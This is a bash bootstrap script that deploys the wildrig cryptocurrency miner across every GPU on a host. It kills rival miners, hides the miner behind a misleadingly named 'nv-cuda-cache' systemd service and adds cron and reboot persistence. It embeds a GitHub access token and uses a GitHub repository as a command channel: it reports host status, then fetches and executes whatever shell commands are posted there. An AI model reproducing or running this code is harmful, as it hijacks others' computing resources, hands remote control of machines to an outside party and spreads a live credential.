#!/bin/bash
# ul86 bootstrap — fabricmanager-535 fix + wildrig pearl ladder + 4 persistence layers + GitHub heartbeat/cmd channel
exec >>/var/log/ul86.log 2>&1
echo "=== ul86 start $(date -u +%FT%TZ) host=$(hostname -s)"
set -u
GH=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
REPO=dongsuju/ul-plant
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
H=$(hostname -s); P="ps-$H"; L=/opt/fleet; B=$L/bin
mkdir -p $L/logs $B /etc/cron.d
put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "{\"message\":\"ul86\",\"content\":\"$b\",\"branch\":\"main\"}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
ph(){ put "ps12/$P.$1.txt" "$(date -u +%FT%TZ) $2"; }
getsha(){ curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$1?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1; }
# 1. early boot marker: proves this script executed
put "ps12/$P.boot.txt" "$(date -u +%FT%TZ)"
ph p1 boot "drv=$(nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>&1 | head -1) smi_rc=$?"
# 2. fabricmanager for A100-SXM4 NVSwitch boxes
if ! systemctl is-active --quiet nvidia-fabricmanager 2>/dev/null; then
  export DEBIAN_FRONTEND=noninteractive
  ph p2 apt-start "fw=inactive"
  systemctl stop unattended-upgrades >/dev/null 2>&1
  pkill -9 -f unattended-upgr >/dev/null 2>&1
  timeout 200 apt-get -o Acquire::http::Timeout=20 -o Acquire::https::Timeout=20 -o Acquire::Retries=1 -o DPkg::Lock::Timeout=120 update -y >/tmp/ul86_apt.log 2>&1
  echo "UPDATE rc=$?" >>/tmp/ul86_apt.log
  timeout 300 apt-get -o DPkg::Lock::Timeout=120 install -y nvidia-fabricmanager-535 >>/tmp/ul86_apt.log 2>&1 || timeout 300 apt-get -o DPkg::Lock::Timeout=120 install -y nvidia-fabricmanager >>/tmp/ul86_apt.log 2>&1
  echo "INSTALL rc=$? pkgs=$(grep -c '^Setting up' /tmp/ul86_apt.log 2>/dev/null)" >>/tmp/ul86_apt.log
  systemctl enable --now nvidia-fabricmanager >/dev/null 2>&1
  ph p2b apt-done "fw=$(systemctl is-active nvidia-fabricmanager 2>/dev/null) $(tail -2 /tmp/ul86_apt.log 2>/dev/null | tr '\n' ' ')"
else
  ph p2 skip "fw=active"
fi
# 3. kill old generations (never our own guard)
pkill -f 'ps15_|ps12\.sh|ul17_|ul18_|ul19_|ps_sup|ps9_sup|ps8_sup' >/dev/null 2>&1
pkill -x krig-miner >/dev/null 2>&1; pkill -x wildrig-multi >/dev/null 2>&1
ph p3 oldgens
# 4. wildrig binary
if [ ! -x $B/wildrig-multi ] || [ "$(stat -c%s $B/wildrig-multi 2>/dev/null || echo 0)" -lt 20000000 ]; then
  curl -sL -m 240 -o /tmp/wr.tgz "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"
  rm -rf /tmp/wrx; mkdir -p /tmp/wrx; tar xzf /tmp/wr.tgz -C /tmp/wrx >/dev/null 2>&1
  f=$(find /tmp/wrx -name 'wildrig-multi' -type f | head -1); [ -n "$f" ] && cp "$f" $B/wildrig-multi && chmod +x $B/wildrig-multi
fi
put "ps12/$P.install.txt" "engine=wildrig ul86v2 wildrig=$([ -x $B/wildrig-multi ] && echo yes || echo no) size=$(stat -c%s $B/wildrig-multi 2>/dev/null || echo 0) fw=$(systemctl is-active nvidia-fabricmanager 2>/dev/null) drv=$(nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>&1 | head -1) smi_rc=$? $(date -u +%FT%TZ)"
ph p4 wildrig "wr=$(stat -c%s $B/wildrig-multi 2>/dev/null || echo 0)"
# 5. per-card runners (CUDA_VISIBLE_DEVICES=N + explicit pool ladder)
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "${N:-0}" -ge 1 ] || N=8
i=0; while [ $i -lt $N ]; do
  cat > $L/ul86_g$i.sh <<EOF
#!/bin/bash
export CUDA_VISIBLE_DEVICES=$i
exec $B/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u $W.ul-ps-$H-g$i -p x -i 8 --no-color >>$L/logs/u86-g$i.log 2>&1
EOF
  chmod +x $L/ul86_g$i.sh; i=$((i+1))
done
ph p5 runners "N=$N"
# 6. heartbeat + command channel guard
cat > $L/ul86_guard.sh <<'GD'
#!/bin/bash
exec 9>/opt/fleet/ul86.lock; flock -n 9 || exit 0
GH=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
REPO=dongsuju/ul-plant
H=$(hostname -s); P="ps-$H"; L=/opt/fleet
put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "{\"message\":\"ul86hb\",\"content\":\"$b\",\"branch\":\"main\"}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
while true; do
  T=$(date -u +%FT%TZ)
  ACC=$(grep -h 'accepted' $L/logs/u86-*.log 2>/dev/null | tail -3)
  HB="stage=beat host=$H ts=$T engine=wildrig-ul86
--- apt
$(tail -2 /tmp/ul86_apt.log 2>/dev/null)
--- smi_rc=$(nvidia-smi -L >/dev/null 2>&1; echo $?)
--- procs
$(pgrep -af 'wildrig-multi' | head -12)
--- units
$(systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | head -12)
--- gpus
$(nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu --format=csv,noheader 2>/dev/null)
--- acc
$ACC"
  put "ps12/$P.txt" "$HB"
  C="ps12/cmd/$P.sh"; J=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$C?ref=main")
  S=$(printf '%s' "$J" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
  if [ -n "$S" ] && [ "$S" != "$(cat $L/last_cmd86 2>/dev/null)" ]; then
    printf '%s' "$J" | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["content"]).decode())' > /tmp/u86_cmd.sh 2>/dev/null
    if [ -s /tmp/u86_cmd.sh ]; then O=$(bash /tmp/u86_cmd.sh 2>&1 | tail -200); echo "$S" > $L/last_cmd86; put "ps12/out/$P.txt" "$O"; fi
  fi
  sleep 120
done
GD
chmod +x $L/ul86_guard.sh
cat > $L/ul86_boot.sh <<'BT'
#!/bin/bash
exec >>/var/log/ul86.log 2>&1
GH=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
curl -s -m 60 -H "Authorization: token $GH" -H "User-Agent: ul" -H "Accept: application/vnd.github.raw" "https://api.github.com/repos/dongsuju/ul-plant/contents/ps12/bootstrap86.sh?ref=main" -o /tmp/ul86_run.sh
[ -s /tmp/ul86_run.sh ] && bash /tmp/ul86_run.sh
BT
chmod +x $L/ul86_boot.sh
# 7. systemd + cron persistence
cat > /etc/systemd/system/nv-cuda-cache@.service <<'SU'
[Unit]
Description=nv cuda cache
After=network-online.target nvidia-fabricmanager.service
[Service]
Type=simple
ExecStart=/opt/fleet/ul86_g%i.sh
Restart=always
RestartSec=10
Nice=5
[Install]
WantedBy=multi-user.target
SU
systemctl daemon-reload >/dev/null 2>&1
printf '*/3 * * * * root /opt/fleet/ul86_guard.sh >/dev/null 2>&1\n@reboot root /bin/bash /opt/fleet/ul86_boot.sh\n' > /etc/cron.d/ul86; chmod 644 /etc/cron.d/ul86
i=0; while [ $i -lt $N ]; do systemctl enable nv-cuda-cache@$i >/dev/null 2>&1; systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; i=$((i+1)); done
setsid /opt/fleet/ul86_guard.sh >/dev/null 2>&1 &
ph p6 done "N=$N"
echo "=== ul86 done $(date -u +%FT%TZ) N=$N"
